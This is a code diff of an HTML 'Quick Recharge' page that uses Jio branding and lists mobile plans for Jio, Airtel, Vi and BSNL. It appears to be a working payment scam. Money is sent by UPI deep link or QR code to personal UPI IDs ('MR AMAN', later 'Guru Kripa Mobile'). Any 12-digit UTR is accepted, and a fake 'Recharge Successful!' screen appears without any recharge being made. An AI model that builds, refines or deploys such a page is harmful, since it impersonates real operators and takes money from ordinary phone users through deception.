@@ -3,117 +3,175 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Jio Quick Recharge</title>
+    <title>Quick Recharge Portal</title>
     <style>
         :root { --jio-blue: #0a2885; --bg: #f5f7fa; }
-        body { font-family: sans-serif; background: var(--bg); margin: 0; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); margin: 0; padding: 0; }
         .hidden { display: none; }
-        
-        /* 3-Second Loader Design */
-        .loader-overlay { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: white; }
-        .spin { width: 45px; height: 45px; border: 5px solid #f3f3f3; border-top: 5px solid var(--jio-blue); border-radius: 50%; animation: spin 1s linear infinite; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-
-        /* Premium UI Elements */
-        .card { background: white; margin: 20px auto; width: 90%; max-width: 400px; padding: 25px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
-        .btn-blue { background: var(--jio-blue); color: white; border: none; width: 100%; padding: 15px; border-radius: 25px; font-weight: bold; font-size: 18px; cursor: pointer; }
-        .plan-item { background: white; margin: 12px; padding: 15px; border-radius: 12px; border: 1px solid #ddd; text-align: left; position: relative; }
-        .badge { background: #fff3e0; color: #e65100; font-size: 11px; padding: 3px 8px; border-radius: 5px; font-weight: bold; margin-bottom: 8px; display: inline-block; }
+        .loader-container { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: white; }
+        .spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid var(--jio-blue); border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .card { background: white; margin: 30px auto; width: 90%; max-width: 400px; padding: 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; box-sizing: border-box; }
+        input, select { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 10px; font-size: 16px; box-sizing: border-box; background: white; }
+        .btn-main { background: var(--jio-blue); color: white; border: none; width: 100%; padding: 15px; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 18px; }
+        .header { background: var(--jio-blue); color: white; padding: 15px; position: sticky; top: 0; z-index: 100; display: flex; align-items: center; }
+        .plan-card { background: white; margin: 12px; border-radius: 15px; overflow: hidden; box-shadow: 0 4px 10px rgba(0,0,0,0.05); border: 1px solid #eee; text-align: left; }
+        .plan-header { padding: 15px; display: flex; justify-content: space-between; align-items: center; }
+        #timer { font-size: 26px; color: #e74c3c; font-weight: bold; margin: 15px 0; border: 2px solid #e74c3c; display: inline-block; padding: 5px 15px; border-radius: 10px; }
+        .qr-container img { width: 220px; border: 5px solid white; box-shadow: 0 0 10px rgba(0,0,0,0.1); margin: 10px 0; }
+        .checkmark { font-size: 80px; color: #2ecc71; display: block; animation: bounce 0.6s ease-out; }
+        @keyframes bounce { 0% { transform: scale(0); } 80% { transform: scale(1.2); } 100% { transform: scale(1); } }
     </style>
 </head>
 <body>
 
-    <div id="step1">
+    <div id="step-1">
         <div class="card">
-            <h2 style="color:var(--jio-blue)">Quick Recharge</h2>
-            <input type="tel" id="mobileNum" placeholder="Enter Mobile Number" maxlength="10" style="width:100%; padding:12px; margin:15px 0; border:1px solid #ccc; border-radius:8px; box-sizing:border-box;">
-            <select style="width:100%; padding:12px; margin-bottom:15px; border:1px solid #ccc; border-radius:8px;">
-                <option>Jio (True 5G)</option>
-                <option>Airtel (5G Plus)</option>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/be/Jio_logo.svg" width="60" style="margin-bottom: 20px;">
+            <h2>Quick Recharge</h2>
+            
+            <input type="tel" id="mobile" placeholder="Enter Mobile Number" maxlength="10">
+            
+            <select id="operator">
+                <option value="" disabled selected>Select Operator</option>
+                <option value="Jio">Jio (True 5G)</option>
+                <option value="Airtel">Airtel (5G Plus)</option>
+                <option value="Vi">Vi (Hero Unlimited)</option>
+                <option value="BSNL">BSNL (Special)</option>
             </select>
-            <button class="btn-blue" onclick="move('step1', 'step2')">Get Plans →</button>
+
+            <button class="btn-main" onclick="showLoader('step-1', 'step-2')">Get Plans →</button>
         </div>
     </div>
 
-    <div id="loadingScreen" class="hidden">
-        <div class="loader-overlay">
-            <div class="spin"></div>
-            <p style="margin-top:15px; color:#555; font-weight:bold;">Verifying Details...</p>
+    <div id="loader" class="hidden">
+        <div class="loader-container">
+            <div class="spinner"></div>
+            <h3 style="margin-top: 20px; color: #555;">Processing...</h3>
         </div>
     </div>
 
-    <div id="step2" class="hidden">
-        <div style="background:var(--jio-blue); color:white; padding:15px; font-weight:bold;">Popular Plans</div>
-        <div id="plans-container"></div>
+    <div id="step-2" class="hidden">
+        <div class="header"><span onclick="location.reload()" style="cursor:pointer">←</span> <span id="op-title" style="margin-left: 15px;">Popular Plans</span></div>
+        <div id="plan-container"></div>
     </div>
 
-    <div id="step3" class="hidden">
+    <div id="step-3" class="hidden">
         <div class="card">
-            <h1 id="payPrice" style="margin:0; font-size:40px;">₹0</h1>
-            <div class="badge">Pro Google Gemini Plan</div>
-            <p style="color:#666; font-size:14px;">Merchant: <b>MR AMAN</b></p>
+            <h3 style="margin: 0; color: var(--jio-blue);">Guru Kripa Mobile</h3>
+            <p style="margin: 5px 0; font-weight: bold; font-size: 20px;">Payable Amount: ₹<span id="lock-amt"></span></p>
             
-            <img src="qr.jpg" alt="BharatPe QR" style="width:220px; border:1px solid #eee; margin:10px 0;">
+            <div class="qr-container">
+                <img id="auto_qr" src="" alt="Scan to Pay">
+            </div>
             
-            <button class="btn-blue" id="finalPayBtn">Pay with UPI App</button>
-            <p style="font-size:11px; color:#999; margin-top:10px;">Safe & Secure BharatPe Gateway</p>
+            <div id="timer">02:00</div>
+            
+            <input type="number" id="utr_input" placeholder="Enter 12-Digit UTR Number">
+            <p style="font-size: 11px; color: #888;">UPI ID: Q180904571@ybl</p>
+            
+            <button class="btn-main" onclick="verifyUTR()">Verify & Submit</button>
+        </div>
+    </div>
+
+    <div id="step-fail" class="hidden">
+        <div class="card">
+            <h2 style="color: #c0392b;">Time Out!</h2>
+            <p>UTR submit karne ka samay khatam ho gaya.</p>
+            <button class="btn-main" onclick="location.reload()">Try Again</button>
+        </div>
+    </div>
+
+    <div id="step-4" class="hidden">
+        <div class="card">
+            <div class="checkmark">✔</div>
+            <h2 style="color: #2ecc71;">Recharge Successful!</h2>
+            <p>Number: <b id="final-num"></b><br>Operator: <b id="final-op"></b><br>Amount: ₹<b id="final-amt"></b></p>
+            <button class="btn-main" onclick="location.reload()">Done</button>
         </div>
     </div>
 
     <script>
-        // MR AMAN's BharatPe UPI Details
-        const amanUPI = "BHARATPE.8Y0Y1E0M3W31937@fbpe";
-        const merchant = "MR AMAN";
-        let selectedAmt = 0;
+        let selectedMobile = "";
+        let selectedAmount = 0;
+        let selectedOperator = "";
+        let timerInterval;
 
-        function move(oldStep, nextStep) {
-            document.getElementById(oldStep).classList.add('hidden');
-            document.getElementById('loadingScreen').classList.remove('hidden');
-            
+        function showLoader(curr, next, amt = 0) {
+            if(curr === 'step-1') {
+                selectedMobile = document.getElementById('mobile').value;
+                selectedOperator = document.getElementById('operator').value;
+                if(selectedMobile.length < 10) return alert("Sahi number dalein.");
+                if(!selectedOperator) return alert("Kripya Operator select karein.");
+            }
+            if(amt > 0) selectedAmount = amt;
+
+            document.getElementById(curr).classList.add('hidden');
+            document.getElementById('loader').classList.remove('hidden');
+
             setTimeout(() => {
-                document.getElementById('loadingScreen').classList.add('hidden');
-                document.getElementById(nextStep).classList.remove('hidden');
-                if(nextStep === 'step2') loadPlans();
-            }, 3000); // 3 Second loading
+                document.getElementById('loader').classList.add('hidden');
+                document.getElementById(next).classList.remove('hidden');
+                if(next === 'step-2') {
+                    document.getElementById('op-title').innerText = selectedOperator + " Plans";
+                    renderPlans();
+                }
+                if(next === 'step-3') startPayment();
+            }, 3000);
         }
 
-        function loadPlans() {
+        function renderPlans() {
+            const container = document.getElementById('plan-container');
+            container.innerHTML = "";
             const plans = [
-                {amt: 1, val: "28 Days", data: "2 GB/Day"},
-                {amt: 500, val: "28 Days", data: "2 GB/Day"},
-                {amt: 899, val: "90 Days", data: "2 GB/Day + 20GB"},
-                {amt: 3599, val: "365 Days", data: "2.5 GB/Day"}
+                {p: 199, v: "28 Days", d: "2 GB/Day"},
+                {p: 249, v: "30 Days", d: "2.5 GB/Day"},
+                {p: 466, v: "84 Days", d: "1.5 GB/Day"},
+                {p: 549, v: "90 Days", d: "2 GB/Day"},
+                {p: 2599, v: "365 Days", d: "2.5 GB/Day"}
             ];
-            let listHtml = "";
-            plans.forEach(p => {
-                listHtml += `
-                <div class="plan-item">
-                    <div class="badge">PRO GOOGLE GEMINI</div>
-                    <div style="display:flex; justify-content:space-between; align-items:center;">
-                        <span style="font-size:24px; font-weight:bold;">₹${p.amt}</span>
-                        <span style="color:red; font-size:11px; font-weight:bold;">TRUE 5G</span>
+            plans.forEach(plan => {
+                container.innerHTML += `
+                <div class="plan-card">
+                    <div class="plan-header">
+                        <div><h2 style="margin:0">₹${plan.p}</h2><small>Unlimited Voice</small></div>
+                        <div style="color:red; font-weight:bold;">TRUE 5G</div>
                     </div>
-                    <div style="margin:10px 0; font-size:13px; color:#666;">
-                        Validity: <b>${p.val}</b> | Data: <b>${p.data}</b>
-                    </div>
-                    <button class="btn-blue" style="padding:8px; font-size:14px;" onclick="initPay(${p.amt})">Buy Now</button>
+                    <div style="padding:0 15px 15px; font-size:13px;">Validity: <b>${plan.v}</b> | Data: <b>${plan.d}</b></div>
+                    <button class="btn-main" style="border-radius:0; padding:10px;" onclick="showLoader('step-2', 'step-3', ${plan.p})">Buy Now</button>
                 </div>`;
             });
-            document.getElementById('plans-container').innerHTML = listHtml;
         }
 
-        function initPay(amt) {
-            selectedAmt = amt;
-            document.getElementById('payPrice').innerText = "₹" + amt;
-            
-            // Mobile UPI App deep link
-            document.getElementById('finalPayBtn').onclick = function() {
-                window.location.href = `upi://pay?pa=${amanUPI}&pn=${encodeURIComponent(merchant)}&am=${amt}&cu=INR`;
-            };
-            
-            move('step2', 'step3');
+        function startPayment() {
+            document.getElementById('lock-amt').innerText = selectedAmount;
+            const upiId = "Q180904571@ybl";
+            const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=upi://pay?pa=${upiId}%26pn=GuruKripa%26am=${selectedAmount}%26cu=INR`;
+            document.getElementById('auto_qr').src = qrUrl;
+
+            let timeLeft = 120; // 2 Minutes
+            const timerDisplay = document.getElementById('timer');
+            timerInterval = setInterval(() => {
+                let m = Math.floor(timeLeft / 60);
+                let s = timeLeft % 60;
+                timerDisplay.innerText = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    showLoader('step-3', 'step-fail');
+                }
+                timeLeft--;
+            }, 10000);
+        }
+
+        function verifyUTR() {
+            const utr = document.getElementById('utr_input').value;
+            if(utr.length < 12) return alert("Sahi 12-digit UTR dalein.");
+            clearInterval(timerInterval);
+            document.getElementById('final-num').innerText = selectedMobile;
+            document.getElementById('final-op').innerText = selectedOperator;
+            document.getElementById('final-amt').innerText = selectedAmount;
+            showLoader('step-3', 'step-4');
         }
     </script>
 </body>
 </html>
-
